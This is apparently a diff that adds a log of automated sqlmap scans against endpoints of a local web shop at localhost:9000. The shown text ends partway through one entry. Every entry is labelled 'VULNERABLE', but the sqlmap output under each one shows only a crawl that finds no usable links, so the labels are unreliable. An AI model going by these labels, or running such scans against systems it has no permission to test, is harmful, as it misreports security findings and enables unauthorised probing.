@@ -1,0 +1,1515 @@
+================================================================================
+VULNERABLE: http://localhost:9000/
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.9.3#stable}
+|_ -| . [,]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 05:11:28 /2025-06-25/
+
+[05:11:28] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-US) AppleWebKit/530.6 (KHTML, like Gecko) Chrome/ Safari/530.6' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[05:11:28] [INFO] starting crawler for target URL 'http://localhost:9000/'
+[05:11:28] [INFO] searching for links with depth 1
+[05:11:28] [WARNING] no usable links found (with GET parameters)
+
+[*] ending @ 05:11:28 /2025-06-25/
+
+
+================================================================================
+VULNERABLE: http://localhost:9000/api/Addresss
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.9.3#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 05:11:30 /2025-06-25/
+
+[05:11:30] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.211.4 Safari/532.0' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[05:11:30] [INFO] starting crawler for target URL 'http://localhost:9000/api/Addresss'
+[05:11:30] [INFO] searching for links with depth 1
+[05:11:30] [WARNING] no usable links found (with GET parameters)
+
+[*] ending @ 05:11:31 /2025-06-25/
+
+
+================================================================================
+VULNERABLE: http://localhost:9000/api/Addresss/1
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.9.3#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 05:11:32 /2025-06-25/
+
+[05:11:32] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.7) Gecko/20070914 Firefox/2.0.0.7' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[05:11:32] [INFO] starting crawler for target URL 'http://localhost:9000/api/Addresss/1'
+[05:11:32] [INFO] searching for links with depth 1
+[05:11:32] [WARNING] no usable links found (with GET parameters)
+
+[*] ending @ 05:11:33 /2025-06-25/
+
+
+================================================================================
+VULNERABLE: http://localhost:9000/api/Addresss/2
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.9.3#stable}
+|_ -| . ["]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 05:11:34 /2025-06-25/
+
+[05:11:34] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux i686; fr; rv:1.8.1.8) Gecko/20071022 Ubuntu/7.10 (gutsy) Firefox/2.0.0.8' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[05:11:34] [INFO] starting crawler for target URL 'http://localhost:9000/api/Addresss/2'
+[05:11:34] [INFO] searching for links with depth 1
+[05:11:35] [WARNING] no usable links found (with GET parameters)
+
+[*] ending @ 05:11:35 /2025-06-25/
+
+
+================================================================================
+VULNERABLE: http://localhost:9000/api/Addresss/3
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.9.3#stable}
+|_ -| . [)]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 05:11:37 /2025-06-25/
+
+[05:11:37] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Win98; fr-FR; rv:1.7.6) Gecko/20050226 Firefox/1.0.1' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[05:11:37] [INFO] starting crawler for target URL 'http://localhost:9000/api/Addresss/3'
+[05:11:37] [INFO] searching for links with depth 1
+[05:11:37] [WARNING] no usable links found (with GET parameters)
+
+[*] ending @ 05:11:38 /2025-06-25/
+
+
+================================================================================
+VULNERABLE: http://localhost:9000/api/BasketItems/
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.9.3#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 05:11:39 /2025-06-25/
+
+[05:11:39] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[05:11:39] [INFO] starting crawler for target URL 'http://localhost:9000/api/BasketItems/'
+[05:11:39] [INFO] searching for links with depth 1
+[05:11:40] [WARNING] no usable links found (with GET parameters)
+
+[*] ending @ 05:11:40 /2025-06-25/
+
+
+================================================================================
+VULNERABLE: http://localhost:9000/api/BasketItems/1
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.9.3#stable}
+|_ -| . [.]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 05:11:42 /2025-06-25/
+
+[05:11:42] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Windows NT 6.1; fr; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 (.NET CLR 3.5.30729)' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[05:11:42] [INFO] starting crawler for target URL 'http://localhost:9000/api/BasketItems/1'
+[05:11:42] [INFO] searching for links with depth 1
+[05:11:43] [WARNING] no usable links found (with GET parameters)
+
+[*] ending @ 05:11:43 /2025-06-25/
+
+
+================================================================================
+VULNERABLE: http://localhost:9000/api/BasketItems/2
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.9.3#stable}
+|_ -| . [)]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 05:11:44 /2025-06-25/
+
+[05:11:44] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.113 Safari/534.30' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[05:11:44] [INFO] starting crawler for target URL 'http://localhost:9000/api/BasketItems/2'
+[05:11:44] [INFO] searching for links with depth 1
+[05:11:45] [WARNING] no usable links found (with GET parameters)
+
+[*] ending @ 05:11:45 /2025-06-25/
+
+
+================================================================================
+VULNERABLE: http://localhost:9000/api/BasketItems/3
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.9.3#stable}
+|_ -| . [,]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 05:11:47 /2025-06-25/
+
+[05:11:47] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Windows NT 6.1; es-ES; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 GTB7.1' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[05:11:47] [INFO] starting crawler for target URL 'http://localhost:9000/api/BasketItems/3'
+[05:11:47] [INFO] searching for links with depth 1
+[05:11:47] [WARNING] no usable links found (with GET parameters)
+
+[*] ending @ 05:11:48 /2025-06-25/
+
+
+================================================================================
+VULNERABLE: http://localhost:9000/api/BasketItems/4
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.9.3#stable}
+|_ -| . ["]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 05:11:49 /2025-06-25/
+
+[05:11:49] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-us) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.9.2' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[05:11:49] [INFO] starting crawler for target URL 'http://localhost:9000/api/BasketItems/4'
+[05:11:49] [INFO] searching for links with depth 1
+[05:11:50] [WARNING] no usable links found (with GET parameters)
+
+[*] ending @ 05:11:50 /2025-06-25/
+
+
+================================================================================
+VULNERABLE: http://localhost:9000/api/BasketItems/5
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.9.3#stable}
+|_ -| . [(]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 05:11:51 /2025-06-25/
+
+[05:11:51] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; CrOS i686 12.433.216) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.105 Safari/534.30' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[05:11:51] [INFO] starting crawler for target URL 'http://localhost:9000/api/BasketItems/5'
+[05:11:51] [INFO] searching for links with depth 1
+[05:11:52] [WARNING] no usable links found (with GET parameters)
+
+[*] ending @ 05:11:52 /2025-06-25/
+
+
+================================================================================
+VULNERABLE: http://localhost:9000/api/BasketItems/6
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.9.3#stable}
+|_ -| . [.]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 05:11:54 /2025-06-25/
+
+[05:11:54] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2b5) Gecko/20091204 Firefox/3.6b5' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[05:11:54] [INFO] starting crawler for target URL 'http://localhost:9000/api/BasketItems/6'
+[05:11:54] [INFO] searching for links with depth 1
+[05:11:54] [WARNING] no usable links found (with GET parameters)
+
+[*] ending @ 05:11:55 /2025-06-25/
+
+
+================================================================================
+VULNERABLE: http://localhost:9000/api/BasketItems/7
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.9.3#stable}
+|_ -| . [.]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 05:11:56 /2025-06-25/
+
+[05:11:56] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.0.14) Gecko/2009090216 Firefox/3.0.14' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[05:11:56] [INFO] starting crawler for target URL 'http://localhost:9000/api/BasketItems/7'
+[05:11:56] [INFO] searching for links with depth 1
+[05:11:57] [WARNING] no usable links found (with GET parameters)
+
+[*] ending @ 05:11:57 /2025-06-25/
+
+
+================================================================================
+VULNERABLE: http://localhost:9000/api/BasketItems/8
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.9.3#stable}
+|_ -| . [.]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 05:11:59 /2025-06-25/
+
+[05:11:59] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Windows NT 5.1; tr-TR) AppleWebKit/523.15 (KHTML, like Gecko) Version/3.0 Safari/523.15' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[05:11:59] [INFO] starting crawler for target URL 'http://localhost:9000/api/BasketItems/8'
+[05:11:59] [INFO] searching for links with depth 1
+[05:12:00] [WARNING] no usable links found (with GET parameters)
+
+[*] ending @ 05:12:00 /2025-06-25/
+
+
+================================================================================
+VULNERABLE: http://localhost:9000/api/BasketItems/9
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.9.3#stable}
+|_ -| . [,]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 05:12:01 /2025-06-25/
+
+[05:12:01] [INFO] fetched random HTTP User-Agent header value 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[05:12:01] [INFO] starting crawler for target URL 'http://localhost:9000/api/BasketItems/9'
+[05:12:01] [INFO] searching for links with depth 1
+[05:12:02] [WARNING] no usable links found (with GET parameters)
+
+[*] ending @ 05:12:02 /2025-06-25/
+
+
+================================================================================
+VULNERABLE: http://localhost:9000/api/Cards
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.9.3#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 05:12:04 /2025-06-25/
+
+[05:12:04] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.10) Gecko/20050918 Firefox/1.0.6' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[05:12:04] [INFO] starting crawler for target URL 'http://localhost:9000/api/Cards'
+[05:12:04] [INFO] searching for links with depth 1
+[05:12:04] [WARNING] no usable links found (with GET parameters)
+
+[*] ending @ 05:12:04 /2025-06-25/
+
+
+================================================================================
+VULNERABLE: http://localhost:9000/api/Cards/
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.9.3#stable}
+|_ -| . [(]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 05:12:06 /2025-06-25/
+
+[05:12:06] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.1) Gecko/2008070208 Firefox/3.0.0' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[05:12:06] [INFO] starting crawler for target URL 'http://localhost:9000/api/Cards/'
+[05:12:06] [INFO] searching for links with depth 1
+[05:12:07] [WARNING] no usable links found (with GET parameters)
+
+[*] ending @ 05:12:07 /2025-06-25/
+
+
+================================================================================
+TIMEOUT: http://localhost:9000/api/Challenges/?name=Score%20Board
+================================================================================
+VULNERABLE: http://localhost:9000/api/Deliverys
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.9.3#stable}
+|_ -| . [)]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 05:14:09 /2025-06-25/
+
+[05:14:09] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux i686; de; rv:1.8.0.8) Gecko/20061025 Firefox/1.5.0.8' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[05:14:09] [INFO] starting crawler for target URL 'http://localhost:9000/api/Deliverys'
+[05:14:09] [INFO] searching for links with depth 1
+[05:14:10] [WARNING] no usable links found (with GET parameters)
+
+[*] ending @ 05:14:10 /2025-06-25/
+
+
+================================================================================
+VULNERABLE: http://localhost:9000/api/Deliverys/3
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.9.3#stable}
+|_ -| . [']     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 05:14:11 /2025-06-25/
+
+[05:14:11] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[05:14:11] [INFO] starting crawler for target URL 'http://localhost:9000/api/Deliverys/3'
+[05:14:11] [INFO] searching for links with depth 1
+[05:14:12] [WARNING] no usable links found (with GET parameters)
+
+[*] ending @ 05:14:12 /2025-06-25/
+
+
+================================================================================
+TIMEOUT: http://localhost:9000/api/Products/1?d=Wed%20Jun%2025%202025
+================================================================================
+TIMEOUT: http://localhost:9000/api/Products/24?d=Wed%20Jun%2025%202025
+================================================================================
+TIMEOUT: http://localhost:9000/api/Products/33?d=Wed%20Jun%2025%202025
+================================================================================
+TIMEOUT: http://localhost:9000/api/Products/6?d=Wed%20Jun%2025%202025
+================================================================================
+VULNERABLE: http://localhost:9000/api/Quantitys/
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.9.3#stable}
+|_ -| . [(]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 05:22:21 /2025-06-25/
+
+[05:22:21] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.67 Safari/537.36' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[05:22:21] [INFO] starting crawler for target URL 'http://localhost:9000/api/Quantitys/'
+[05:22:21] [INFO] searching for links with depth 1
+[05:22:21] [WARNING] no usable links found (with GET parameters)
+
+[*] ending @ 05:22:21 /2025-06-25/
+
+
+================================================================================
+VULNERABLE: http://localhost:9000/assets/i18n/en.json
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.9.3#stable}
+|_ -| . [.]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 05:22:23 /2025-06-25/
+
+[05:22:23] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.6) Gecko/20060728 Firefox/1.5.0.6' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[05:22:23] [INFO] starting crawler for target URL 'http://localhost:9000/assets/i18n/en.json'
+[05:22:23] [INFO] searching for links with depth 1
+[05:22:24] [WARNING] no usable links found (with GET parameters)
+
+[*] ending @ 05:22:24 /2025-06-25/
+
+
+================================================================================
+VULNERABLE: http://localhost:9000/assets/i18n/es_ES.json
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.9.3#stable}
+|_ -| . [.]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 05:22:26 /2025-06-25/
+
+[05:22:26] [INFO] fetched random HTTP User-Agent header value 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; en) Opera 8.02' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[05:22:26] [INFO] starting crawler for target URL 'http://localhost:9000/assets/i18n/es_ES.json'
+[05:22:26] [INFO] searching for links with depth 1
+[05:22:28] [WARNING] no usable links found (with GET parameters)
+
+[*] ending @ 05:22:28 /2025-06-25/
+
+
+================================================================================
+VULNERABLE: http://localhost:9000/main.js
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.9.3#stable}
+|_ -| . [.]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 05:22:30 /2025-06-25/
+
+[05:22:30] [INFO] fetched random HTTP User-Agent header value 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; IT) Opera 8.0' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[05:22:30] [INFO] starting crawler for target URL 'http://localhost:9000/main.js'
+[05:22:30] [INFO] searching for links with depth 1
+[05:22:32] [WARNING] no usable links found (with GET parameters)
+
+[*] ending @ 05:22:32 /2025-06-25/
+
+
+================================================================================
+VULNERABLE: http://localhost:9000/polyfills.js
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.9.3#stable}
+|_ -| . [.]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 05:22:33 /2025-06-25/
+
+[05:22:33] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.4) Gecko/20060508 Firefox/1.5.0.4' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[05:22:33] [INFO] starting crawler for target URL 'http://localhost:9000/polyfills.js'
+[05:22:33] [INFO] searching for links with depth 1
+[05:22:34] [WARNING] no usable links found (with GET parameters)
+
+[*] ending @ 05:22:35 /2025-06-25/
+
+
+================================================================================
+VULNERABLE: http://localhost:9000/profile
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.9.3#stable}
+|_ -| . [.]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 05:22:36 /2025-06-25/
+
+[05:22:37] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[05:22:37] [INFO] starting crawler for target URL 'http://localhost:9000/profile'
+[05:22:37] [INFO] searching for links with depth 1
+[05:22:37] [WARNING] no usable links found (with GET parameters)
+
+[*] ending @ 05:22:38 /2025-06-25/
+
+
+================================================================================
+VULNERABLE: http://localhost:9000/rest/admin/application-configuration
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.9.3#stable}
+|_ -| . [']     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 05:22:39 /2025-06-25/
+
+[05:22:39] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.0 Safari/532.0' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[05:22:39] [INFO] starting crawler for target URL 'http://localhost:9000/rest/admin/application-configuration'
+[05:22:39] [INFO] searching for links with depth 1
+[05:22:40] [WARNING] no usable links found (with GET parameters)
+
+[*] ending @ 05:22:40 /2025-06-25/
+
+
+================================================================================
+VULNERABLE: http://localhost:9000/rest/admin/application-version
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.9.3#stable}
+|_ -| . ["]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 05:22:42 /2025-06-25/
+
+[05:22:42] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[05:22:42] [INFO] starting crawler for target URL 'http://localhost:9000/rest/admin/application-version'
+[05:22:42] [INFO] searching for links with depth 1
+[05:22:43] [WARNING] no usable links found (with GET parameters)
+
+[*] ending @ 05:22:43 /2025-06-25/
+
+
+================================================================================
+VULNERABLE: http://localhost:9000/rest/basket/1
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.9.3#stable}
+|_ -| . [)]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
